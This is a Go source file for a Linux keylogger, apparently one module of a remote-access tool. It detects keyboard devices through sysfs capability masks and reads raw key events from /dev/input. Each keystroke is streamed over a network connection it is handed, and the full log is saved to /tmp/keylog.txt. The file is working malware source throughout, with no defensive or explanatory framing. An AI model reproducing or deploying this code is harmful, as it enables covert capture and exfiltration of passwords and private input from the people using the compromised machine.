package util 

// /usr/include/linux/input-event-codes.h
// #define EV_KEY                  0x01
// /usr/include/linux/input.h
// /sys/class/input

import (
    "encoding/binary"
    "fmt"
    "math/big"
    "os"
    "path/filepath"
    "strings"
    "context"
    "syscall"
    "os/signal"
    "net"
)

type InputEvent struct {
    Sec     int64 
    Usec    int64  
    Type    uint16 
    Code    uint16 
    Value   int32  
}

const (
    EV_KEY = 1
    KEY_PRESS = 1
    keyA = 30

    KeyLogFilePath = "/tmp/keylog.txt"
)

func isKeyboard(sysfsEventPath string) (bool, error) {
    realPath, err := filepath.EvalSymlinks(sysfsEventPath)
    if err != nil {
        return false, err
    }
    inputDir := filepath.Dir(realPath)
    keyFile := filepath.Join(inputDir, "capabilities", "key")
    var data []byte
    data, err = os.ReadFile(keyFile)
    if err != nil {
        return false, err 
    }
    hexFields := strings.Fields(string(data))
    if len(hexFields) == 0 {
        return false, nil 
    }
    hexStr := strings.Join(hexFields, "")
    mask := new(big.Int)
    if _, ok := mask.SetString(hexStr, 16); !ok {
        
        return false, fmt.Errorf("failed to parse hex mask %q", hexStr)
    }
    return mask.Bit(keyA) == 1, nil 
}

func kbdLog(device string, ch chan<- string) error{
    deviceFile, err := os.Open(device)
    if err != nil {
        return err 
    }
    defer deviceFile.Close()
    for {
        var ev InputEvent
        if err := binary.Read(deviceFile, binary.LittleEndian, &ev); err != nil {
            return err 
        }
        if ev.Type != EV_KEY || ev.Value != KEY_PRESS {
            continue
        }
        code := ev.Code
        name, found := keyNames[code]
        output := ""
        if found {
            if len(name) == 1 {
                output = name
            } else {
                output = "[" + name + "]"
            }
        } else {
            output = fmt.Sprintf("[0x%X]", code)
        }
        ch <- output 
    }
}

func Keylogger(conn net.Conn, externalCtx context.Context) error{ 
    ctx, cancel := context.WithCancel(context.Background())
    sysfsPattern := "/sys/class/input/event*"
    sysfsEvents, err := filepath.Glob(sysfsPattern)
    if err != nil {
        return err 
    }
    var kbdFiles []string
    for _, sysfsEvent := range sysfsEvents {
        devName := filepath.Base(sysfsEvent)              
        devPath := filepath.Join("/dev/input", devName)    
        if _, err := os.Stat(devPath); os.IsNotExist(err) {
            continue
        }
        if ok, err := isKeyboard(sysfsEvent); err != nil {
            fmt.Println(err)
        } else if ok{
            kbdFiles = append(kbdFiles, devPath)
        }
    }
    ch := make(chan string)
    for _, kbdFile := range kbdFiles{
        go kbdLog(kbdFile, ch)
    }
    go func() {
		sigCh := make(chan os.Signal, 3)
		signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM, os.Kill)
		<-sigCh
		cancel()
	}() 
    accKeylogStr := ""
    loop: 
    for {
        select {
        case <-ctx.Done():
            break loop 
        case <-externalCtx.Done():
            break loop
        case keystroke := <-ch:
            fmt.Fprintf(conn, "%s\n", keystroke)
            accKeylogStr += keystroke
        }
    }
    file, err := os.Create(KeyLogFilePath)
    if err != nil {
        fmt.Fprintf(conn, "%s\n", "failed to create log file.")
    } else{
        defer file.Close()
    }
    _, err = file.WriteString(accKeylogStr)
    if err != nil {
        fmt.Fprintf(conn, "%s\n", "failed to wrtie to log file.")
    } 
   fmt.Fprintf(conn, "%s\n", "Terminating Keylogger.")
   return nil 
}

var keyNames = map[uint16]string{
    1:  "ESC",
    2:  "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
    12: "-", 13: "=", 14: "BACKSPACE",
    15: "TAB", 16: "Q", 17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I", 24: "O", 25: "P",
    26: "[", 27: "]", 28: "ENTER",
    29: "LEFTCTRL", 30: "A", 31: "S", 32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L",
    39: ";", 40: "'", 41: "`", 42: "LEFTSHIFT", 43: "\\",
    44: "Z", 45: "X", 46: "C", 47: "V", 48: "B", 49: "N", 50: "M", 51: ",", 52: ".", 53: "/",
    54: "RIGHTSHIFT", 55: "KPASTERISK", 56: "LEFTALT", 57: "SPACE",
    58: "CAPSLOCK", 59: "F1", 60: "F2", 61: "F3", 62: "F4", 63: "F5", 64: "F6", 65: "F7",
    66: "F8", 67: "F9", 68: "F10", 69: "NUMLOCK", 70: "SCROLLLOCK",
}
